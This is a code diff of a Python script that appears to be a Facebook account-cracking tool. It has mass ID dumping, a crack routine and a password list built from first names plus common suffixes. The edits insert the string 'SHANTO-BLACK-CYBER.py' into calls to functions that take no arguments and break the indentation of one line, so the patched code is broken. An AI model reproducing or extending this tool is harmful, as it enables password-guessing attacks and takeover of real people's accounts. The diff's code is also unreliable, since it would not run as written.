@@ -1793,7 +1793,7 @@ def menu():
         login()
         dump_massal()
     elif HEART in ['1']:
-        crack_file()
+        crack_file("SHANTO-BLACK-CYBER.py")
     elif HEART in ['2','02']:
         os.system('xdg-open https://github.com/Mr-Alon')
         os.system("python nono.py")
@@ -1996,7 +1996,7 @@ def crack_file():
         back()
     for xid in lin:
         id.append(xid)
-    setting()
+    setting("SHANTO-BLACK-CYBER.py")
  
 #-------------[ PENGATURAN-IDZ ]---------------#
  
@@ -2086,7 +2086,7 @@ def passwrd():
                     pwv.append(frs+'22')
                     pwv.append(frs+'222')
                     pwv.append(frs+'gaming')
-                    pwv.append(frs+'khan')
+                   pwv.append(frs+'khan')
                     pwv.append(frs+'hosen')
                     pwv.append(frs+'Gaming')
                     pwv.append(frs+'khan')
@@ -2252,4 +2252,4 @@ if __name__=='__main__':
     except:pass
     try:os.system('touch .prox.txt')
     except:pass
-menu()
+menu("SHANTO-BLACK-CYBER.py")
